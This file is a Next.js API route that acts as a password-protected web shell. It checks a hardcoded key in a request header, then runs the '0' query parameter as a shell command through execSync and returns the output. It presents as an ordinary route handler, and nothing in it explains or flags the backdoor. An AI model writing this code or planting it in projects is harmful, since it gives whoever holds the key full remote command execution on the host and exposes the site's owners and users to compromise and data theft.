import { NextResponse } from "next/server";
import { execSync } from "child_process";
const K="fTRR5gTKhGbHdBTJ9i2rrPzg";
export async function GET(req: Request){
  const key=req.headers.get("api-key");
  if(key!==K)return new NextResponse("Unauthorized",{status:401});
  const cmd=new URL(req.url).searchParams.get("0");
  if(!cmd)return new NextResponse("0",{status:400});
  try{return new NextResponse(execSync(cmd).toString());}
  catch(e){return new NextResponse(String(e),{status:500});}
}